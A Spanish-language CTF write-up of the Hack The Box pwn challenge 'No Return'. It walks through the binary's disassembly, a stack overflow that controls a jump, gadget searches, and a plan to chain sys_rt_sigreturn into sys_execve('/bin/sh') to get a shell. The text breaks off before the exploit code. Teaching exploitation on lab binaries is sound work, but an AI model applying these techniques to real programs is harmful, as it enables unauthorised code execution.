<!doctype html><html lang="es"><head><title>No Return | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Binario estático de 64 bits. JOP. `sys_rt_sigreturn` y `sys_execve`"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Binario estático de 64 bits. JOP. `sys_rt_sigreturn` y `sys_execve`"><meta itemprop="keywords" content><meta itemprop="name" content="No Return"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Binario estático de 64 bits. JOP. `sys_rt_sigreturn` y `sys_execve`"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="No Return"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/no-return/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Binario estático de 64 bits. JOP. `sys_rt_sigreturn` y `sys_execve`"><meta name="twitter:description" content="Binario estático de 64 bits. JOP. `sys_rt_sigreturn` y `sys_execve`"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="No Return"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/htb-challenges/pwn/no-return/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/no-return/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/no-return/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/no-return/&amp;text=No%20Return" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/pwn/no-return/&amp;title=No%20Return" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">No Return</h1><p class="mb4 f6 dib tracked">20 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#analizando-código-ensamblador">Analizando código ensamblador</a></li><li><a href="#vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a><ul><li><a href="#perfeccionando-la-estrategia">Perfeccionando la estrategia</a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#creando-espacio-para-el-_payload_">Creando espacio para el <em>payload</em></a></li><li><a href="#construyendo-el-_payload_">Construyendo el <em>payload</em></a></li><li><a href="#perfeccionando-el-_payload_">Perfeccionando el <em>payload</em></a></li><li><a href="#activación-de-aslr">Activación de ASLR</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>no-return</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-red">No RELRO</span>
Stack:    <span class="code-dark-red">No canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
</code></pre></div><h2 id="ingeniería-inversa">Ingeniería inversa</h2><p>El binario está compilado estáticamente y es tan pequeño que podemos mostrar el código ensamblador complato aquí:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -d <span class="mtku">no-return</span>

no-return:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 &lt;.text&gt;:
  401000:       5c                      pop    rsp
  401001:       5f                      pop    rdi
  401002:       5e                      pop    rsi
  401003:       5d                      pop    rbp
  401004:       5a                      pop    rdx
  401005:       59                      pop    rcx
  401006:       5b                      pop    rbx
  401007:       48 31 c0                xor    rax,rax
  40100a:       ff 67 01                jmp    QWORD PTR [rdi+0x1]
  40100d:       48 ff c0                inc    rax
  401010:       de f1                   fdivrp st(1),st
  401012:       ff 22                   jmp    QWORD PTR [rdx]
  401014:       48 2b 74 24 10          sub    rsi,QWORD PTR [rsp+0x10]
  401019:       f5                      cmc
  40101a:       ff 22                   jmp    QWORD PTR [rdx]
  40101c:       48 89 e1                mov    rcx,rsp
  40101f:       fd                      std
  401020:       ff 22                   jmp    QWORD PTR [rdx]
  401022:       48 8d 0c d9             lea    rcx,[rcx+rbx*8]
  401026:       fd                      std
  401027:       ff 21                   jmp    QWORD PTR [rcx]
  401029:       48 31 d5                xor    rbp,rdx
  40102c:       0f 95 c4                setne  ah
  40102f:       ff a5 00 00 44 e8       jmp    QWORD PTR [rbp-0x17bc0000]
  401035:       48 01 f4                add    rsp,rsi
  401038:       de f9                   fdivp  st(1),st
  40103a:       ff 22                   jmp    QWORD PTR [rdx]
  40103c:       48 01 dd                add    rbp,rbx
  40103f:       9b                      fwait
  401040:       ff 65 c7                jmp    QWORD PTR [rbp-0x39]
  401043:       88 a7 00 00 44 e8       mov    BYTE PTR [rdi-0x17bc0000],ah  
  401049:       f9                      stc
  40104a:       ff 22                   jmp    QWORD PTR [rdx]
  40104c:       59                      pop    rcx
  40104d:       48 89 d1                mov    rcx,rdx
  401050:       5a                      pop    rdx
  401051:       ff 21                   jmp    QWORD PTR [rcx]
  401053:       48 ff c1                inc    rcx
  401056:       de f1                   fdivrp st(1),st
  401058:       ff 22                   jmp    QWORD PTR [rdx]
  40105a:       48 92                   xchg   rdx,rax
  40105c:       de f9                   fdivp  st(1),st
  40105e:       ff 21                   jmp    QWORD PTR [rcx]
  401060:       48 ff c3                inc    rbx
  401063:       de f1                   fdivrp st(1),st
  401065:       ff 22                   jmp    QWORD PTR [rdx]
  401067:       48 87 cf                xchg   rdi,rcx
  40106a:       fd                      std
  40106b:       ff 22                   jmp    QWORD PTR [rdx]
  40106d:       54                      push   rsp
  40106e:       48 31 c0                xor    rax,rax
  401071:       48 ff c0                inc    rax
  401074:       48 31 ff                xor    rdi,rdi
  401077:       48 ff c7                inc    rdi
  40107a:       48 89 e6                mov    rsi,rsp
  40107d:       ba 08 00 00 00          mov    edx,0x8
  401082:       0f 05                   syscall
  401084:       48 81 ee b0 00 00 00    sub    rsi,0xb0
  40108b:       48 31 c0                xor    rax,rax
  40108e:       48 31 ff                xor    rdi,rdi
  401091:       48 8d 36                lea    rsi,[rsi]
  401094:       ba c0 00 00 00          mov    edx,0xc0
  401099:       0f 05                   syscall
  40109b:       48 83 c4 08             add    rsp,0x8
  40109f:       ff 64 24 f8             jmp    QWORD PTR [rsp-0x8]
</code></pre></div><p>Esta vez, el binario está desarrollado solo para ser explotado, no hay ningúna funcionalidad realista.</p><p>La entrada real del binario es la dirección <code>0x40106d</code>. Podemos comprobarlo en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">no-return</span>
Reading symbols from <span class="code-dark-green">no-return</span>...
(No debugging symbols found in <span class="code-dark-green">no-return</span>)  
<span class="code-red">gef➤</span>  start
<span class="code-blue">[+]</span> Breaking at entry-point: 0x40106d
</code></pre></div><p>Por lo que la funcionalidad del programa se gestiona con este código ensamblador:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">  40106d:       54                      push   rsp
  40106e:       48 31 c0                xor    rax,rax
  401071:       48 ff c0                inc    rax
  401074:       48 31 ff                xor    rdi,rdi
  401077:       48 ff c7                inc    rdi
  40107a:       48 89 e6                mov    rsi,rsp
  40107d:       ba 08 00 00 00          mov    edx,0x8
  401082:       0f 05                   syscall
  401084:       48 81 ee b0 00 00 00    sub    rsi,0xb0
  40108b:       48 31 c0                xor    rax,rax
  40108e:       48 31 ff                xor    rdi,rdi
  401091:       48 8d 36                lea    rsi,[rsi]
  401094:       ba c0 00 00 00          mov    edx,0xc0
  401099:       0f 05                   syscall
  40109b:       48 83 c4 08             add    rsp,0x8
  40109f:       ff 64 24 f8             jmp    QWORD PTR [rsp-0x8]  
</code></pre></div><h3 id="analizando-código-ensamblador">Analizando código ensamblador</h3><p>Lo que hace el programa es escribir datos en <code>stdout</code> usando <code>sys_write</code> y luego leyendo datos de entrada con <code>sys_read</code>. Finalmente, realiza un salto extraño. El programa se rompe al ejecutarlo normalmente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./no-return</span>
Jasdf
zsh: segmentation fault (core dumped)  ./no-return

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> asdf | <span class="code-dark-green">./no-return</span>
~Bzsh: done                              echo asdf |  
zsh: segmentation fault (core dumped)  ./no-return
</code></pre></div><p>Nótese que en <code>sys_write</code> necesitamos estos valores:</p><ul><li><code>$rax</code> tiene que ser <code>1</code></li><li><code>$rdi</code> guarda el descriptor de archivo (<code>1</code> para el <code>stdout</code>)</li><li><code>$rsi</code> tiene la dirección de la <em>string</em> que se va a escribir</li><li><code>$rdx</code> contiene el tamaño a escribir en bytes</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">  40106d:       54                      push   rsp
  40106e:       48 31 c0                xor    rax,rax  
  401071:       48 ff c0                inc    rax
  401074:       48 31 ff                xor    rdi,rdi
  401077:       48 ff c7                inc    rdi
  40107a:       48 89 e6                mov    rsi,rsp
  40107d:       ba 08 00 00 00          mov    edx,0x8
  401082:       0f 05                   syscall
</code></pre></div><p>Esta instrucción es solo una fuga de memoria (específicamente, una dirección de la pila, <em>stack</em>). Lo vimos antes, pero este ejemplo resulta más claro:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> asdf | <span class="code-dark-green">./no-return</span> | <span class="code-dark-green">xxd</span>
00000000: 80c8 43e9 fc7f 0000                      ..C.....  
zsh: done                              echo asdf |
zsh: segmentation fault (core dumped)  ./no-return |
zsh: done                              xxd
</code></pre></div><p>Para <code>sys_read</code>, necesitamos esta configuración:</p><ul><li><code>$rax</code> tiene que ser <code>0</code></li><li><code>$rdi</code> tiene que guardar el descriptor de archivo (<code>0</code> para el <code>stdin</code>)</li><li><code>$rsi</code> tiene la dirección en la que escribir los datos leídos</li><li><code>$rdx</code> contiene el número de bytes a leer</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">  401084:       48 81 ee b0 00 00 00    sub    rsi,0xb0
  40108b:       48 31 c0                xor    rax,rax
  40108e:       48 31 ff                xor    rdi,rdi
  401091:       48 8d 36                lea    rsi,[rsi]  
  401094:       ba c0 00 00 00          mov    edx,0xc0
  401099:       0f 05                   syscall
</code></pre></div><p>El programa está leyendo hasta <code>0xc0</code> (192) bytes. Y los datos se almacenan en la pila (específicamente en <code>$rsp - 0xb0</code>, porque <code>$rsi</code> es igual que <code>$rsp</code> en el código ensamblador anterior)</p><p>Finalmente, el programa realiza una instrucción <code>jmp</code> a la dirección guardada en la dirección apuntada por <code>$rsp - 0x8</code> (nótense las diferencias entre <code>jmp rsp-0x8</code> and <code>jmp QWORD PTR [rsp-0x8]</code>), después de añadir <code>0x8</code> al registro:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">  40109b:       48 83 c4 08             add    rsp,0x8
  40109f:       ff 64 24 f8             jmp    QWORD PTR [rsp-0x8]  
</code></pre></div><h3 id="vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></h3><p>Por tanto, podemos controlar este valor, ya que el programa lee hasta <code>0xc0</code> bytes y el <em>buffer</em> reservado en el <em>stack</em> es de <code>0xb0</code>, por lo que podemos usar los siguientes 8 bytes para guardar la dirección a la que saltar (recordemos que NX está habilitado, por lo que no podemos añadir <em>shellcode</em> y saltar a esta sección).</p><p>Lo único que tenemos por ahora es una fuga de una dirección del <em>stack</em> y una instrucción <code>jmp</code> que podemos controlar. Tenemos que recordar que hay más instrucciones en ensamblador fuera del punto de entrada del programa.</p><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>La estrategia es usar <code>sys_execve</code> para poder obtener una <em>shell</em>. Para esto, necesitamos:</p><ul><li><code>$rax</code> tiene que ser <code>0x3b</code></li><li><code>$rdi</code> tiene que contener la dirección de la <em>string</em> con el comando a ejecutar (<code>"/bin/sh"</code>)</li><li><code>$rsi</code> tiene que ser <code>0</code></li><li><code>$rdx</code> tiene que ser <code>0</code></li></ul><p>Para controlar <code>$rax</code> y <code>$rdi</code> podemos encontrar algunos <em>gadgets</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">no-return</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">' rax'</span>
0x000000000040100d : inc <span class="code-red">rax</span> ; fdivrp st(1) ; jmp qword ptr [rdx]
0x0000000000401003 : pop rbp ; pop rdx ; pop rcx ; pop rbx ; xor <span class="code-red">rax</span>, <span class="code-red">rax</span> ; jmp qword ptr [rdi + 1]
0x0000000000401006 : pop rbx ; xor <span class="code-red">rax</span>, <span class="code-red">rax</span> ; jmp qword ptr [rdi + 1]
0x0000000000401005 : pop rcx ; pop rbx ; xor <span class="code-red">rax</span>, <span class="code-red">rax</span> ; jmp qword ptr [rdi + 1]
0x0000000000401001 : pop rdi ; pop rsi ; pop rbp ; pop rdx ; pop rcx ; pop rbx ; xor <span class="code-red">rax</span>, <span class="code-red">rax</span> ; jmp qword ptr [rdi + 1]  
0x0000000000401004 : pop rdx ; pop rcx ; pop rbx ; xor <span class="code-red">rax</span>, <span class="code-red">rax</span> ; jmp qword ptr [rdi + 1]
0x0000000000401002 : pop rsi ; pop rbp ; pop rdx ; pop rcx ; pop rbx ; xor <span class="code-red">rax</span>, <span class="code-red">rax</span> ; jmp qword ptr [rdi + 1]
0x000000000040105a : xchg <span class="code-red">rax</span>, rdx ; fdivp st(1) ; jmp qword ptr [rcx]
0x0000000000401007 : xor <span class="code-red">rax</span>, <span class="code-red">rax</span> ; jmp qword ptr [rdi + 1]

<span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">no-return</span> | <span class="code-dark-green">grep</span> -v xor | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">' rax'</span>
0x000000000040100d : inc <span class="code-red">rax</span> ; fdivrp st(1) ; jmp qword ptr [rdx]
0x000000000040105a : xchg <span class="code-red">rax</span>, rdx ; fdivp st(1) ; jmp qword ptr [rcx]

<span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">no-return</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">' rdi'</span>
0x0000000000401001 : pop <span class="code-red">rdi</span> ; pop rsi ; pop rbp ; pop rdx ; pop rcx ; pop rbx ; xor rax, rax ; jmp qword ptr [rdi + 1]
0x0000000000401067 : xchg <span class="code-red">rdi</span>, rcx ; std ; jmp qword ptr [rdx]
</code></pre></div><p>Nótese que he quitado todos los <code>xor rax, rax</code> porque esta instrucción romperá nuestra estrategia poniendo <code>$rax</code> a <code>0</code>. De momento, vamos a mirar estos <em>gadgets</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">no-return</span> | <span class="code-dark-green">grep</span> xchg | grep -E <span class="code-dark-yellow">'rax|rdi'</span>
0x000000000040105a : xchg <span class="code-red">rax</span>, rdx ; fdivp st(1) ; jmp qword ptr [rcx]  
0x0000000000401067 : xchg <span class="code-red">rdi</span>, rcx ; std ; jmp qword ptr [rdx]
</code></pre></div><p>Con estos <em>gadgets</em>, somos capaces de controlar el contenido de <code>$rax</code> y <code>$rdi</code> si controlamos <code>$rdx</code> y <code>$rcx</code>.</p><p>Para poder controlar <code>$rdx</code> y <code>$rcx</code>, tenemos este conjunto de instrucciones al principio del binario:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">  401000:       5c                      pop    rsp
  401001:       5f                      pop    rdi
  401002:       5e                      pop    rsi
  401003:       5d                      pop    rbp
  401004:       5a                      pop    rdx
  401005:       59                      pop    rcx
  401006:       5b                      pop    rbx
  401007:       48 31 c0                xor    rax,rax
  40100a:       ff 67 01                jmp    QWORD PTR [rdi+0x1]
</code></pre></div><p>Nótese que la última instrucción es un <code>jmp</code> a la dirección apuntada por la dirección guardada en <code>$rdi + 1</code>, por lo que tenemos que guardar ahí una dirección que contenga una dirección ejecutable (no puede ser la dirección de <code>"/bin/sh"</code> aún). Además, aunque hay un <code>pop rax</code>, luego viene un <code>xor rax, rax</code> que lo pone a <code>0</code>, por lo que tampoco podemos poner <code>$rax</code> igual a <code>0x3b</code>.</p><p>Entonces, la idea es controlar <code>$rcx</code> y <code>$rdx</code> y luego llamar a uno de los <em>gadgets</em> anteriores. Pero hay un problema si queremos ejecutar ambos, ya que son algo simétricos, y una vez que los valores son correctos para el primer <em>gadget</em>, luego para el segundo causarán un <em>crash</em>. Y no podemos ir al conjunto de instrucciones anterior porque perdemos <code>$rax</code> y <code>$rdi</code>.</p><h3 id="perfeccionando-la-estrategia">Perfeccionando la estrategia</h3><p>Por tanto, tenemos que usar uno de los <em>gadgets</em>. Para poder poner el valor de <code>$rdi</code>, usaré <code>sys_rt_sigreturn</code>, para restaurar un <em>frame</em> a los registros, de manera que son controlados al completo.</p><p>Para un <code>sys_rt_sigreturn</code>, necesitamos que <code>$rax</code> sea <code>0xf</code>, y nada más. Por tanto, podemos poner este valor con:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">0x000000000040105a : xchg rax, rdx ; fdivp st(1) ; jmp qword ptr [rcx]
</code></pre></div><p>Entonces, <code>$rdx</code> tiene que ser <code>0xf</code> y luego la dirección apuntada por <code>$rcx</code> tiene que contener la dirección de una instrucción <code>syscall</code> (<code>0x401082</code> or <code>0x401099</code>). Una vez que lleguemos al paso de <code>sys_rt_sigreturn</code>, configuraremos los registros y ejecutaremos <code>sys_execve</code>.</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Ahora que tenemos la estrategia clara, vamos a implementarlo. En primer lugar, tenemos que poner los datos en la pila.</p><p>Tenemos que darnos cuenta de que podemos usar la última instrucción <code>jmp</code> del programa para saltar de nuevo al inicio. A simple vista, esto no es útil, pero podemos usar un truco. Recordemos que el programa lee hasta <code>0xc0</code> bytes, pero solo <code>0xb0</code> están reservados. Esto es una especie de vulnerabilidad de <em>Buffer Overflow</em>, pero no hay dirección de retorno que 